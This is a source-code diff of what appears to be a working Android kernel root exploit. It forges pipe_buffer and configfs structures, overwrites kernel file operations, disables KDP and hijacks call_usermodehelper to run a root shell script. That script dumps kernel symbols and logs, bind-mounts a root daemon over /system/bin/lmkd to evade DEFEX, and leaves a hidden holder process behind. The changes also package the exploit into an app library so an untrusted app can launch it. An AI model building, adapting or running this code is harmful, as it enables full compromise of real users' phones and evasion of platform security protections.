@@ -148,16 +148,28 @@ int perf_task_ncands;
 uintptr_t perf_task_cands[PERF_TASK_MAX_CANDS];
 int perf_task_cand_votes[PERF_TASK_MAX_CANDS];
 uintptr_t g_cfg_buf;         /* configfs_buffer* (physmap) of the armed attr */
+uintptr_t g_cfg_buf2;        /* second fake configfs_buffer (cfg-forge fd) */
+static int g_cfg_forge_fd = -1;  /* armed fd parked on the rd pipe_buffer array */
+static uintptr_t g_fdarr;        /* cached fdt fd-array VA (fdtable walk) */
+static uint64_t g_max_fds;
 int perf_file_ncands;
 uintptr_t perf_file_cands[PERF_FILE_MAX_CANDS];
 uint8_t g_slide_valid;
 uint64_t g_slide_cached;
 uintptr_t g_bringup_F;
+int g_wq_armed_fd = -1;   /* fd armed with the payload configfs table (wq-umh) */
+uint64_t g_fd_fop;        /* f_op of the fdtable-resolved file (read once) */
+static uintptr_t g_own_task;        /* cached own task (fdtable walk reuse) */
 uint64_t g_bringup_orig_fmode;
 uintptr_t g_bringup_orig_fops;
 uintptr_t g_bringup_orig_priv;
 uint8_t g_bringup_leaked;
 int g_fastroot;
+
+/* deployment-home helpers (defined near wq_umh_readback): G4_HOME env or
+ * /data/local/tmp/a — the boot app sets G4_HOME to its private files dir */
+static const char *g4home(void);
+static const char *gh(const char *suffix);
 
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
@@ -602,14 +614,14 @@ int run_exploit(int argc, char **argv) {
   /* Optional early KDP disable (KDP_FIRST): one W1-style write to
    * kdp_enable, marker-persisted across runs */
   if (!w2_only_env && selinux_ok && getenv("KDP_FIRST")) {
-    if (access("/data/local/tmp/a/.kdp_done", F_OK) == 0) {
+    if (access(gh("/.kdp_done"), F_OK) == 0) {
       pr_info("W-KDP(first): marker present, skipping\n");
     } else {
       slab_drain();
       atomic_store(&consumer_success, 0);
       do_one_write(data_addr(KDP_ENABLE), "W-KDP(first): kdp_enable=0", 1);
       if (atomic_load(&consumer_success) >= 1) {
-        int mfd = open("/data/local/tmp/a/.kdp_done", O_WRONLY | O_CREAT, 0644);
+        int mfd = open(gh("/.kdp_done"), O_WRONLY | O_CREAT, 0644);
         if (mfd >= 0) close(mfd);
       }
       TIMER("W-KDP(first) done");
@@ -914,6 +926,108 @@ int cfg_place(uintptr_t addr) {
   return rwf_phys_write(g_cfg_buf + CFG_BIN_BUFFER_OFF, buf, 16);
 }
 
+/* Same, with an explicit bin_buffer_size — needed for offset pwrites into a
+ * whole target page (the disarm writes single qwords at increasing offsets
+ * into the reclaimed pipe_buffer array page). */
+static int cfg_place_sz(uintptr_t addr, uint32_t size) {
+  unsigned char buf[16] = {0};
+  put64(buf, 0, addr);
+  put32(buf, 8, size);
+  return rwf_phys_write(g_cfg_buf + CFG_BIN_BUFFER_OFF, buf, 16);
+}
+
+/* cfg-forge: a second armed fd whose fake configfs_buffer descriptor stays
+ * PARKED on the rd pipe_buffer array (object 1 in the reclaimed page).
+ * rwf_forge then writes each forged pipe_buffer with a plain offset pwrite —
+ * no a0 merge write, no forge-slot consumption.  This removes the 32-slot
+ * array wall: a0-path forges past slot 31 overflow the 0x500-byte array into
+ * the neighbor slab object, so the queue's link writes never landed
+ * (boot71-81: peek=00 on the queue writes, helper never ran).  With forging
+ * parked, post-arm channel ops are unlimited (the ring FIFO wraps cleanly:
+ * every op splices one slot and drains one slot). */
+int cfg_forge_enabled(void) { return g_cfg_forge_fd >= 0; }
+
+int cfg_forge_pb(const void *pb, size_t slot) {
+  if (g_cfg_forge_fd < 0 || slot >= PIPE_BUFFER_SLOTS)
+    return 0;
+  return pwrite(g_cfg_forge_fd, pb, 0x28, slot * 0x28) == 0x28;
+}
+
+/* Arm a second ashmem fd with the payload fops and park its descriptor on
+ * the rd array.  Costs 4 forge ops (2 arm writes + f_mode RMW) + 1 fdarr
+ * read + 1 park write — must run right after the primary arm, while the a0
+ * budget (<31) still has headroom.  Fallback on failure: the a0 path with
+ * its 31-slot budget (pre-cfg-forge behavior). */
+static void cfg_forge_arm(void) {
+  uintptr_t arr = pipebuf_page_base + PIPE_OBJECT_SIZE;  /* object 1 = rd */
+  int fdB = open_ashmem_device();
+  int ok2 = 0;
+  if (fdB >= 0 && g_fdarr && (uint64_t)fdB < g_max_fds) {
+    uint64_t F2 = rwf_read64(g_fdarr + (uintptr_t)fdB * 8);
+    if (is_direct_ptr(F2)) {
+      g_cfg_buf2 = page_base + 0x1240;   /* second fake configfs_buffer */
+      ok2 = rwf_write64(F2 + 0x10, fake_fops);
+      if (ok2) ok2 = rwf_write64(F2 + 0x20, g_cfg_buf2);
+      /* FMODE_CAN_WRITE RMW, same as the primary arm (DELTA-NOTES §1):
+       * never clobber f_mode on a stalled read */
+      uint32_t fm2 = 0;
+      if (ok2 && rwf_phys_read(F2 + 0xc, &fm2, 4)) {
+        fm2 |= 0x40000;
+        ok2 = rwf_phys_write(F2 + 0xc, &fm2, 4);
+      } else {
+        ok2 = 0;
+      }
+    }
+  }
+  if (ok2) {
+    unsigned char dbuf[16] = {0};
+    put64(dbuf, 0, arr);
+    put32(dbuf, 8, PIPE_BUFFER_SLOTS * 0x28);
+    if (rwf_phys_write(g_cfg_buf2 + CFG_BIN_BUFFER_OFF, dbuf, 16))
+      ok2 = 1;
+    else
+      ok2 = 0;
+  }
+  if (ok2) {
+    g_cfg_forge_fd = fdB;
+    pr_success("wq-umh: cfg-forge parked on rd array (fd=%d arr=%016zx)\n",
+               fdB, arr);
+  } else {
+    pr_warning("wq-umh: cfg-forge arm failed — a0 budget fallback\n");
+  }
+}
+
+/* Zero the ops field of every slot in the rd ring's pipe_buffer array via
+ * the armed configfs attr (one cfg_place, then plain offset pwrites — no
+ * forge slots consumed).  free_pipe_info skips ops==NULL slots, so g4's exit
+ * teardown no longer puts the never-refcounted target pages of forged slots
+ * (image pages from channel reads) — that anon_pipe_buf_release → __folio_put
+ * of a reserved page was the BUG: Bad page state at exit, fatal on device
+ * (panic_on_oops).  The few legit marker slots lose their release too — a
+ * harmless one-page leak each.
+ * Scope: ONLY the rd array (object 1, 0x500 bytes inside its kmalloc-cg-2k
+ * object): the object is 0x800 bytes, and configfs_bin_write_iter runs the
+ * hardened-usercopy heap check against it — the old whole-page placement
+ * (0x1000) aborted with usercopy BUG once cfg-forge made the placement
+ * actually land (boot82). */
+static void rwf_disarm_forged_slots(int cfgfd) {
+  if (cfgfd < 0 || !g_cfg_buf) {
+    pr_warning("wq-umh: disarm skipped (no armed fd)\n");
+    return;
+  }
+  uintptr_t rd_arr = pipebuf_page_base + PIPE_OBJECT_SIZE;
+  if (!cfg_place_sz(rd_arr, PIPE_BUFFER_SLOTS * 0x28)) {
+    pr_warning("wq-umh: disarm cfg_place failed\n");
+    return;
+  }
+  unsigned char zeros[8] = {0};
+  int n = 0;
+  for (int off = 0x10; off + 8 <= PIPE_BUFFER_SLOTS * 0x28; off += 0x28)
+    if (pwrite(cfgfd, zeros, 8, off) == 8)
+      n++;
+  pr_success("wq-umh: forged slots disarmed (%d ops zeroed)\n", n);
+}
+
 int cfg_read8(int fd, uintptr_t addr, uint64_t *out) {
   unsigned char buf[24] = {0};
   put64(buf, 0, 8);                 /* count = 8 */
@@ -927,7 +1041,15 @@ static int run_write1_only(void);
 extern int mini_adb_port;
 extern int mini_adb_shell(const char *cmd);
 
-int main(int argc, char **argv) {
+/* G4_LIBENTRY: rename the CLI entry so the same sources link into the boot
+ * app's JNI shared library (its wrapper calls g4_cli_main in a forked
+ * child — process isolation for the exploit's exit() paths). */
+#ifdef G4_LIBENTRY
+#define MAIN_NAME g4_cli_main
+#else
+#define MAIN_NAME main
+#endif
+int MAIN_NAME(int argc, char **argv) {
     setbuf(stdout, NULL);
     handle_umh_mode(argc, argv);
     if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0) {
@@ -942,7 +1064,7 @@ int main(int argc, char **argv) {
       /* Wait for adb TCP — read the actual port from system property */
       int adb_port = 5555;
       char port_buf[32] = {};
-      read_first_line("/data/local/tmp/a/adb_port", port_buf, sizeof(port_buf));
+      read_first_line(gh("/adb_port"), port_buf, sizeof(port_buf));
       if (port_buf[0]) adb_port = atoi(port_buf);
       if (adb_port <= 0 || adb_port > 65535) adb_port = 5555;
       pr_info("Waiting for adb TCP on port %d...\n", adb_port);
@@ -2227,16 +2349,60 @@ static uintptr_t perf_own_task(void) {
   return 0;
 }
 
+/* Third own-task path: walk the task list BACKWARD from init_task.tasks.prev
+ * (list_add_tail ⇒ head.prev is the newest task — we're a few hops from the
+ * tail, even on a busy device).  All reads are ordinary channel physical
+ * reads — task pages read reliably (unlike the static percpu pages, which
+ * stall through the channel).  Match on tgid == getpid(); comm logged for
+ * confirmation.  Bounded at 400 hops; safe on list mutation (a freed task's
+ * links fail is_direct_ptr and we bail). */
+static uintptr_t listwalk_own_task(void) {
+  uintptr_t head = data_addr(KIMAGE_TEXT_BASE + 0x024FCF40ULL) + TASK_TASKS_OFF;
+  uint64_t cur = rwf_read64(head + 8);        /* tasks.prev = newest */
+  uint64_t first = cur;
+  int hops = 0;
+  while (is_direct_ptr(cur) && hops < 400) {
+    uintptr_t task = (uintptr_t)cur - TASK_TASKS_OFF;
+    uint64_t tgid = rwf_read64(task + TASK_TGID_OFF);
+    if ((uint32_t)tgid == (uint32_t)getpid()) {
+      /* tgid match is sufficient (tgid collision with a *newer* task is
+       * impossible — pid numbers don't recycle that fast); skip the comm
+       * confirm read: one rd-ring slot fewer (the ring wraps at 32). */
+      pr_success("wq-umh: own task via task-list walk: %016zx (hops=%d)\n",
+                 task, hops);
+      return task;
+    }
+    cur = rwf_read64(cur + 8);                /* prev again (backward) */
+    if (cur == first || !cur)
+      break;
+    hops++;
+  }
+  pr_warning("wq-umh: task-list walk found no tgid match (hops=%d)\n", hops);
+  return 0;
+}
+
 static uintptr_t fd_to_file(int fd) {
   pr_info("wq-umh: fdtable walk begin fd=%d\n", fd);
-  uintptr_t T = channel_own_task();
+  /* cheapest proven path first: the backward task-list walk (1-2 hops in
+   * practice — g4 is near the list tail); then the channel rq->curr walk
+   * (static percpu pages stall through the channel); perf last (never
+   * returns on the busy device). */
+  uintptr_t T = g_own_task;   /* cached: the holder disarm walks fdtable too */
   if (!T) {
-    pr_warning("wq-umh: fdtable: channel own-task failed, trying perf\n");
-    T = perf_own_task();
-  }
-  if (!T) {
-    pr_warning("wq-umh: fdtable: own-task find failed\n");
-    return 0;
+    T = listwalk_own_task();
+    if (!T) {
+      pr_warning("wq-umh: fdtable: task-list walk failed, trying channel rq->curr\n");
+      T = channel_own_task();
+    }
+    if (!T) {
+      pr_warning("wq-umh: fdtable: channel own-task failed, trying perf\n");
+      T = perf_own_task();
+    }
+    if (!T) {
+      pr_warning("wq-umh: fdtable: own-task find failed\n");
+      return 0;
+    }
+    g_own_task = T;
   }
   uint64_t files = rwf_read64(T + TASK_FILES_OFF);
   if (!is_direct_ptr(files)) {
@@ -2249,13 +2415,21 @@ static uintptr_t fd_to_file(int fd) {
     pr_warning("wq-umh: fdtable: bad fdt=%016llx\n", (unsigned long long)fdt);
     return 0;
   }
-  uint64_t max_fds = rwf_read64(fdt + FDT_MAX_FDS_OFF);
-  uint64_t fdarr = rwf_read64(fdt + FDT_FD_OFF);
+  /* fdt header in ONE read (max_fds@0, fd@8) — one rd-ring slot, not two */
+  uint64_t fdthdr[2] = {0};
+  if (!rwf_phys_read(fdt + FDT_MAX_FDS_OFF, fdthdr, sizeof(fdthdr))) {
+    pr_warning("wq-umh: fdtable: fdt header read failed\n");
+    return 0;
+  }
+  uint64_t max_fds = fdthdr[0];
+  uint64_t fdarr = fdthdr[1];
   if (!is_direct_ptr(fdarr) || (uint64_t)fd >= max_fds) {
     pr_warning("wq-umh: fdtable: bad fdarr=%016llx max_fds=%llu\n",
                (unsigned long long)fdarr, (unsigned long long)max_fds);
     return 0;
   }
+  g_fdarr = fdarr;      /* cached for the cfg-forge second-fd arm */
+  g_max_fds = max_fds;
   uint64_t F = rwf_read64(fdarr + (uintptr_t)fd * 8);
   if (!is_direct_ptr(F)) {
     pr_warning("wq-umh: fdtable: bad file=%016llx\n", (unsigned long long)F);
@@ -2267,9 +2441,25 @@ static uintptr_t fd_to_file(int fd) {
                (unsigned long long)F, (unsigned long long)fop);
     return 0;
   }
+  g_fd_fop = fop;   /* cached: the repair block must not re-read (ring slots) */
   pr_success("wq-umh: fdtable: fd %d -> file=%016llx f_op=%016llx\n", fd,
              (unsigned long long)F, (unsigned long long)fop);
   return F;
+}
+
+/* Deployment-home indirection: every runtime path that defaults to
+ * /data/local/tmp/a (adb/shell form) can be relocated with G4_HOME — the
+ * boot app sets it to its private files dir (untrusted_app can only write
+ * there).  gh() is NOT thread-safe; all call sites are single-threaded
+ * exploit stages. */
+static const char *g4home(void) {
+  const char *h = getenv("G4_HOME");
+  return (h && h[0]) ? h : "/data/local/tmp/a";
+}
+static const char *gh(const char *suffix) {
+  static char hb[384];
+  snprintf(hb, sizeof(hb), "%s%s", g4home(), suffix);
+  return hb;
 }
 
 /* Pull the helper's output files into OUR (fsync-per-line) log and fsync
@@ -2282,14 +2472,13 @@ static void wq_umh_readback(void) {
   sleep(3);   /* let the async helper finish */
   sync();
   static const char *files[] = {
-    "/data/local/tmp/a/umh_id.txt", "/data/local/tmp/a/id.txt",
-    "/data/local/tmp/a/cmdline.txt", "/data/local/tmp/a/pstore_ls.txt",
-    "/data/local/tmp/a/last_kmsg.txt", "/data/local/tmp/a/dropbox_ls.txt",
-    "/data/local/tmp/cap/id.txt",
+    "/umh_id.txt", "/id.txt",
+    "/cmdline.txt", "/pstore_ls.txt",
+    "/last_kmsg.txt", "/dropbox_ls.txt",
     NULL
   };
   for (int i = 0; files[i]; i++) {
-    int fd = open(files[i], O_RDONLY);
+    int fd = open(gh(files[i]), O_RDONLY);
     if (fd < 0) {
       pr_info("wq-umh: readback %s: %s\n", files[i], strerror(errno));
       continue;
@@ -2306,9 +2495,148 @@ static void wq_umh_readback(void) {
     close(fd);
     pr_info("\nwq-umh: readback %s done (%zu bytes)\n", files[i], total);
   }
-  int dfd = open("/data/local/tmp/a", O_RDONLY | O_DIRECTORY);
+  {
+    int fd = open("/data/local/tmp/cap/id.txt", O_RDONLY);
+    if (fd >= 0) {
+      pr_info("wq-umh: readback cap/id.txt:\n");
+      char buf[1024];
+      ssize_t n;
+      size_t total = 0;
+      while (total < 65536 && (n = read(fd, buf, sizeof(buf))) > 0) {
+        fwrite(buf, 1, n, stdout);
+        total += (size_t)n;
+      }
+      fsync(fd);
+      close(fd);
+      pr_info("\nwq-umh: readback cap/id.txt done (%zu bytes)\n", total);
+    }
+  }
+  int dfd = open(gh(""), O_RDONLY | O_DIRECTORY);
   if (dfd >= 0) { fsync(dfd); close(dfd); }
   sync();
+}
+
+/* Post-root arm + cfg-forge + flag repair — ALL best-effort; runs only
+ * AFTER the helper already fired (the root path never depends on it).  This
+ * is the device-proven order (cycle 88): queue → verify → storm → helper,
+ * with the arm/repair as post-root hardening.  The 2026-08-18 build ran
+ * this block BEFORE the queue — its ~25 forge ops (listwalk hops, two arms,
+ * park) pushed a0 forging past the 32-slot physical rd array on device
+ * (GL_RWF_SLOTS=64 doesn't cap at the array size), so 0/84 cycles ever
+ * triggered: the queue writes overflowed, or the cycle died in the repair.
+ *
+ * The flag repair writes vmemmap — only possible via the configfs virtual
+ * write, which needs an armed ashmem attr fd.  The fuse arm normally gets
+ * its struct file* from the perf FILE leak, which finds NO candidates on
+ * the BZA5 device ("fuse-bringup: no file candidates").  Fallback: resolve
+ * our own ashmem fd via the fdtable walk (fd_to_file) and arm it ourselves.
+ * The repair itself is only attempted when the cfg-forge parked: its
+ * per-page descriptor writes then go through the parked pwrite-forge
+ * (deterministic) instead of the a0 merge — a missed a0 descriptor write
+ * leaves bin_buffer stale and the pwrite lands the flags qword at a WILD
+ * address (panic class).  Even a hang here is tolerable post-root: the
+ * helper's markers/captures are already synced and g4d is already up. */
+static void wq_umh_post_root_arm_repair(int afd) {
+  int repair_ok = 0;
+  if (getenv("RWF_DEBUG"))
+    pr_info("wq-umh: repair inputs: afd=%d g_bringup_F=%016llx fake_fops=%016zx page_base=%016zx\n",
+            afd, (unsigned long long)g_bringup_F, fake_fops, page_base);
+  if (afd >= 0 && g_bringup_F) {
+    /* fuse arm already live (perf file leak path) — repair directly */
+    pr_info("wq-umh: repair via already-armed afd=%d\n", afd);
+    g_wq_armed_fd = afd;
+    repair_ok = rwf_repair_flags_wq_umh(afd, page_base);
+  } else {
+    int repair_fd = afd >= 0 ? afd : open_ashmem_device();
+    if (repair_fd < 0) {
+      pr_warning("wq-umh: no ashmem fd for repair\n");
+    } else {
+      uintptr_t F = fd_to_file(repair_fd);
+      if (F) {
+        uint64_t fop = g_fd_fop;   /* cached by fd_to_file — no re-read */
+        if (getenv("RWF_DEBUG"))
+          pr_info("wq-umh: repair fd=%d F=%016llx fop=%016llx fake_fops=%016zx\n",
+                  repair_fd, (unsigned long long)F, (unsigned long long)fop,
+                  fake_fops);
+        /* "already armed" only counts if WE armed it (g_bringup_F) — a stale
+         * channel read can also return fake_fops; re-arming is idempotent */
+        if (fop != (uint64_t)fake_fops || !g_bringup_F) {
+          if (!fake_fops) {
+            pr_warning("wq-umh: no payload fops table — cannot arm\n");
+          } else {
+            pr_info("wq-umh: arming fd %d via fdtable walk (F=%016llx f_op=%016llx)\n",
+                    repair_fd, (unsigned long long)F, (unsigned long long)fop);
+            g_bringup_orig_fops = fop;
+            g_cfg_buf = page_base + 0x1140;  /* fake configfs_buffer in spray page */
+            int arm_ok = rwf_write64(F + 0x10, fake_fops);
+            if (arm_ok) arm_ok = rwf_write64(F + 0x20, g_cfg_buf);
+            /* FMODE_CAN_WRITE RMW (DELTA-NOTES §1) — the channel read is
+             * flaky; never clobber f_mode on a failed read (0|CAN_WRITE
+             * would drop FMODE_READ etc.), skip the arm instead */
+            uint32_t fm = 0;
+            int fm_ok = 0;
+            for (int t = 0; t < 3 && !fm_ok; t++)
+              fm_ok = rwf_phys_read(F + 0xc, &fm, 4);
+            if (arm_ok && fm_ok) {
+              fm |= 0x40000;
+              arm_ok = rwf_phys_write(F + 0xc, &fm, 4);
+            } else if (!fm_ok) {
+              pr_warning("wq-umh: f_mode read stalled — arm aborted\n");
+              arm_ok = 0;
+            }
+            if (!arm_ok)
+              pr_warning("wq-umh: arm writes failed\n");
+            else {
+              g_wq_armed_fd = repair_fd;
+              /* park a second armed fd on the rd array: post-arm forging
+               * becomes pure pwrite, no forge-slot budget (the 32-slot wall
+               * starved the queue writes — boot71-81) */
+              cfg_forge_arm();
+            }
+          }
+        }
+        /* the repair only runs when the cfg-forge parked (see block comment);
+         * otherwise this is exactly the device-proven repair-skipped flow */
+        if (cfg_forge_enabled())
+          repair_ok = rwf_repair_flags_wq_umh(repair_fd, page_base);
+        else
+          pr_warning("wq-umh: flag repair skipped (cfg-forge not parked)\n");
+      } else {
+        pr_warning("wq-umh: fdtable walk failed — flag repair skipped\n");
+      }
+    }
+  }
+  if (repair_ok)
+    pr_success("wq-umh: flags repaired\n");
+  else
+    pr_warning("wq-umh: flags repair failed/skipped\n");
+}
+
+/* atexit wrapper: pr_error exits with exit(-1) all over the failure paths,
+ * so the disarm must run via atexit to cover them (userspace handlers run
+ * before do_exit's fd teardown — the channel/configfs are still usable). */
+static void wq_umh_disarm_atexit(void) {
+  rwf_disarm_forged_slots(g_wq_armed_fd);
+  /* exit-panic backstop: fork a child that inherits every fd and then just
+   * sleeps.  While it lives, g4's exit teardown releases nothing (every
+   * file's refcount stays >0), so the balancing image-page refs held by the
+   * holder/peek/rd pipes are never put — the whole anon_pipe_buf_release →
+   * bad_page class at exit is suppressed, not just the rd ring (the disarm
+   * above covers rd even if the child is later killed; the holder pipe's
+   * 128-slot array would need its pipe_buffer VA resolved through the ring,
+   * which costs 6 forge slots the post-queue verify/requeue can't spare).
+   * Device residue: one sleeping "g4hold" process per cycle (freed on
+   * reboot; if it is OOM-killed the teardown BUGs fire then — no worse than
+   * before this fix). */
+  pid_t c = fork();
+  if (c == 0) {
+    close(0);
+    close(1);
+    close(2);
+    prctl(PR_SET_NAME, "g4hold", 0, 0, 0);
+    for (;;)
+      pause();
+  }
 }
 
 /* GL_WQ_UMH: plant a fake work_struct running call_usermodehelper_exec_work
@@ -2320,8 +2648,19 @@ static void wq_umh_readback(void) {
 static __attribute__((always_inline)) int wq_umh_root(int afd) {
   static const uint64_t seed[] = { 0x108, 0x100, 0x110, 0xf8, 0x118, 0xf0 };
   pr_info("wq-umh: begin\n");
+  /* single atexit registration covers every exit below (incl. pr_error's
+   * exit(-1)): disarms the rd ring (if armed) and forks the fd-holder child
+   * that suppresses the whole pipe-teardown bad_page class. */
+  {
+    static int atexit_done;
+    if (!atexit_done) { atexit_done = 1; atexit(wq_umh_disarm_atexit); }
+  }
   const char *umh_sh =
     "#!/system/bin/sh\n"
+    /* $0 is this script's own path — derive the deployment home from it
+     * (adb form: /data/local/tmp/a; boot-app form: the app's private files
+     * dir).  All paths below use $A so one binary serves both. */
+    "A=$(dirname \"$0\")\n"
     /* Builtin-only creds diagnostic FIRST: `id` emitted NOTHING in the
      * cycle-3 run (external toybox commands may fail silently under the
      * UMH creds state), while builtin echo always lands.  /proc/self/status
@@ -2336,23 +2675,40 @@ static __attribute__((always_inline)) int wq_umh_root(int afd) {
     /* file captures: sync after EVERY write — the device panics when g4
      * exits (fuse collateral at pipe teardown) and dirty page-cache writes
      * die with it (cycle-3: helper completed, zero files on disk after). */
-    "id > /data/local/tmp/a/umh_id.txt 2>&1; echo \"W-ID-RC=$?\"; sync\n"
-    "touch /data/local/tmp/a/.umh_rooted; echo \"W-MARK-RC=$?\"; sync\n"
-    "cat /proc/last_kmsg > /data/local/tmp/a/last_kmsg.txt 2>/dev/null; sync\n"
-    "dmesg > /data/local/tmp/a/dmesg.txt 2>/dev/null; sync\n"
-    "cat /proc/iomem > /data/local/tmp/a/iomem.txt 2>/dev/null; sync\n"
-    "cat /proc/cmdline > /data/local/tmp/a/cmdline.txt 2>/dev/null; sync\n"
-    "cat /proc/kallsyms > /data/local/tmp/a/kallsyms.txt 2>/dev/null; sync\n"
-    "id > /data/local/tmp/a/id.txt 2>&1; sync\n"
-    "ls -la /sys/fs/pstore/ > /data/local/tmp/a/pstore_ls.txt 2>/dev/null; sync\n"
-    "for f in /sys/fs/pstore/*; do cp $f /data/local/tmp/a/ 2>/dev/null; done; sync\n"
-    /* dropbox keeps previous-boot SYSTEM_LAST_KMSG/SYSTEM_BOOT entries across
-     * multiple boots — the alloc_storm death trace (20:49 boot) lives there.
-     * Helper is uid=0 u:r:kernel:s0 (proven 20:06 cycle): can read the
-     * dropbox dir that blocks shell with EACCES. */
-    "ls -la /data/system/dropbox/ > /data/local/tmp/a/dropbox_ls.txt 2>&1; sync\n"
-    "for f in $(ls -t /data/system/dropbox/SYSTEM_LAST_KMSG@* 2>/dev/null | head -3); do cp $f /data/local/tmp/a/ 2>/dev/null; cp $f /data/local/tmp/cap/ 2>/dev/null; done; sync\n"
-    "for f in $(ls -t /data/system/dropbox/SYSTEM_BOOT@* 2>/dev/null | head -3); do cp $f /data/local/tmp/a/ 2>/dev/null; cp $f /data/local/tmp/cap/ 2>/dev/null; done; sync\n"
+    "id > $A/umh_id.txt 2>&1; echo \"W-ID-RC=$?\"; sync\n"
+    "touch $A/.umh_rooted; echo \"W-MARK-RC=$?\"; sync\n"
+    /* root daemon FIRST, right after the marker: the 13:39 rooted cycle
+     * wrote every capture yet never produced a g4d/pidfile — the helper
+     * most plausibly died in the sync-heavy capture tail before reaching
+     * the g4d line at the end.  Start g4d here so a mid-script death can't
+     * cost the root shell.  The helper's stdout is NOT reliably captured,
+     * so log to files: g4d.rc (exit code) + g4d.out (stderr) + g4d.mnt
+     * (mount errors).
+     * DEFEX safeplace kills uid=0 execs from /data/local/tmp (16:36 cycle:
+     * "[DEFEX] Safeplace violation [task=sh, child=/data/local/tmp/a/g4d,
+     * uid=0]" → SIGKILL, G4D-RC=137).  Bind-mount g4d over a dormant
+     * system daemon binary so the exec's path is DEFEX-safe; lazy-umount
+     * right after (g4d daemonizes at once and sets its own comm).  lmkd
+     * never re-execs at runtime, so the shadow window is risk-free.
+     * Fallback when the bind fails (no lmkd / mount denied): direct exec —
+     * works wherever DEFEX is off. */
+    "chmod 755 $A/g4d 2>/dev/null; "
+    "if mount --bind $A/g4d /system/bin/lmkd 2>$A/g4d.mnt; then /system/bin/lmkd > $A/g4d.out 2>&1; umount -l /system/bin/lmkd 2>/dev/null; else $A/g4d > $A/g4d.out 2>&1; fi; echo \"G4D-RC=$?\" > $A/g4d.rc; sync\n"
+    "cat /proc/last_kmsg > $A/last_kmsg.txt 2>/dev/null; sync\n"
+    "dmesg > $A/dmesg.txt 2>/dev/null; sync\n"
+    "cat /proc/iomem > $A/iomem.txt 2>/dev/null; sync\n"
+    "cat /proc/cmdline > $A/cmdline.txt 2>/dev/null; sync\n"
+    "cat /proc/kallsyms > $A/kallsyms.txt 2>/dev/null; sync\n"
+    "id > $A/id.txt 2>&1; sync\n"
+    "ls -la /sys/fs/pstore/ > $A/pstore_ls.txt 2>/dev/null; sync\n"
+    "for f in /sys/fs/pstore/*; do cp $f $A/ 2>/dev/null; done; sync\n"
+    /* dropbox keeps previous-boot SYSTEM_LAST_KMSG/SYSTEM_BOOT entries
+     * across multiple boots — earlier panic evidence lives there.  Helper
+     * is uid=0 u:r:kernel:s0: can read the dropbox dir that blocks shell
+     * with EACCES. */
+    "ls -la /data/system/dropbox/ > $A/dropbox_ls.txt 2>&1; sync\n"
+    "for f in $(ls -t /data/system/dropbox/SYSTEM_LAST_KMSG@* 2>/dev/null | head -3); do cp $f $A/ 2>/dev/null; cp $f /data/local/tmp/cap/ 2>/dev/null; done; sync\n"
+    "for f in $(ls -t /data/system/dropbox/SYSTEM_BOOT@* 2>/dev/null | head -3); do cp $f $A/ 2>/dev/null; cp $f /data/local/tmp/cap/ 2>/dev/null; done; sync\n"
     /* secondary: the original cap/ dir (works if root + policy allow) */
     "mkdir -p /data/local/tmp/cap && chmod 755 /data/local/tmp/cap; "
     "cat /proc/last_kmsg > /data/local/tmp/cap/last_kmsg.txt 2>/dev/null; "
@@ -2363,34 +2719,39 @@ static __attribute__((always_inline)) int wq_umh_root(int afd) {
     "id > /data/local/tmp/cap/id.txt 2>&1; "
     "ls -la /sys/fs/pstore/ > /data/local/tmp/cap/pstore_ls.txt 2>/dev/null; "
     "for f in /sys/fs/pstore/*; do cp $f /data/local/tmp/cap/ 2>/dev/null; done; "
-    "chmod 644 /data/local/tmp/cap/* /data/local/tmp/a/*.txt 2>/dev/null; "
+    "chmod 644 /data/local/tmp/cap/* $A/*.txt 2>/dev/null; "
     "echo CAPTURES-DONE\n";
-  int sfd = open("/data/local/tmp/a/umh.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
+  int sfd = open(gh("/umh.sh"), O_WRONLY|O_CREAT|O_TRUNC, 0755);
   if (sfd < 0)
     pr_error("wq-umh: cannot write helper script\n");
   write(sfd, umh_sh, strlen(umh_sh));
   close(sfd);
-  unlink("/data/local/tmp/a/.umh_rooted");
+  unlink(gh("/.umh_rooted"));
 
   /* fake subprocess_info blob at page_base + WQ_FAKE_UMH_OFF.
    * completion layout (E2E-proven): done@0, wait.lock@8, task_list@0x10/0x18.
-   * Strings must sit clear of the completion: path @+0x20, script @+0x30,
-   * argv[] @+0x50, envp[] @+0x68. */
-  uint8_t buf[0x70] = {0};
+   * Strings must sit clear of the completion: path @+0x20, script @+0x30
+   * (up to 0x38 bytes incl NUL — covers app-private G4_HOME paths like
+   * /data/user/0/com.mobilehackinglab.ghostlock/files/umh.sh = 55),
+   * argv[] @+0x68, envp[] = the argv[2] NULL slot @+0x78 (envp is just a
+   * NULL terminator; sharing the slot is legitimate).
+   * Blob is 0x80 = the rwf_phys_write cap. */
+  char script_path[0x38];
+  snprintf(script_path, sizeof(script_path), "%s/umh.sh", g4home());
+  if (strlen(script_path) + 1 > 0x38)
+    pr_error("wq-umh: G4_HOME too long for the blob\n");
+  uint8_t buf[0x80] = {0};
   memcpy(buf + 0x10, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x10)}, 8);
   memcpy(buf + 0x18, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x10)}, 8);
   memcpy(buf + 0x20, "/system/bin/sh", 15);
-  memcpy(buf + 0x30, "/data/local/tmp/a/umh.sh", 25);
-  /* argv[] @ blob+0x50: { "/system/bin/sh", "/data/local/tmp/a/umh.sh", NULL }.
+  memcpy(buf + 0x30, script_path, strlen(script_path) + 1);
+  /* argv[] @ blob+0x68: { "/system/bin/sh", script, NULL }; envp @+0x78.
    * E2E-proven: path/argv must be full page-relative pointers — e stored the
    * raw offsets 0x1818/0x1828 here (the pb-prefixed add was dead code in e),
    * which faults in getname_kernel when the work actually runs. */
-  memcpy(buf + 0x50, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x20)}, 8);
-  memcpy(buf + 0x58, &(__uint64_t[]){(uint64_t)(page_base + WQ_FAKE_UMH_OFF + 0x30)}, 8);
-  int ok = rwf_phys_write(page_base + WQ_FAKE_UMH_OFF, buf, 0x20);
-  if (ok) ok = rwf_phys_write(page_base + WQ_FAKE_UMH_OFF + 0x20, buf + 0x20, 0x20);
-  if (ok) ok = rwf_phys_write(page_base + WQ_FAKE_UMH_OFF + 0x40, buf + 0x40, 0x20);
-  if (ok) ok = rwf_phys_write(page_base + WQ_FAKE_UMH_OFF + 0x60, buf + 0x60, 0x10);
